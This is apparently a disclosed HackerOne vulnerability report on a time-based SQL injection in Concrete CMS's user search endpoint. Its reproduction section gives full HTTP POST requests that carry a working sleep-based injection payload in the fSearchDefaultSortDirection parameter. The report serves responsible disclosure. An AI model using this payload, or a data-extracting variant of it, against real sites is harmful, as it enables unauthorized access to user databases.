# Time-base SQL Injection in Search Users

## Report Details
- **Report ID**: 876800
- **URL**: https://hackerone.com/reports/876800
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-18T02:09:34.023Z
- **Disclosed**: 2020-08-05T01:08:55.415Z

## Reporter
- **Username**: thiennv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
Description
=====================
I've identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint **/index.php/dashboard/users/search** and can be exploited via the **fSearchDefaultSortDirection** param.

I didn't extract any data from the database, I've confirmed the vulnerability using sleep SQL queries with various arithmetic operations. The sleep command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.

For example, setting the value ==fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)== will cause the server to sleep for ==30== seconds or setting the value ==fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)== will cause the server to sleep for ==20== seconds.

To reproduce
=====================
Send the following HTTP request (With sleep=20s):
---------------------
```
POST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 399
Connection: close

field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1
```
Result: Server to sleep for 20 seconds
---------------------
F832170

Send the following HTTP request (With sleep=30s):
---------------------
```
POST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 399
Connection: close

field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1
```
Result: Server to sleep for 30 seconds
---------------------
F832171

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database or extract sensitive information

## Attachments
- Time-base_SQLi_20s.png
- Time-base_SQLi_30s.png
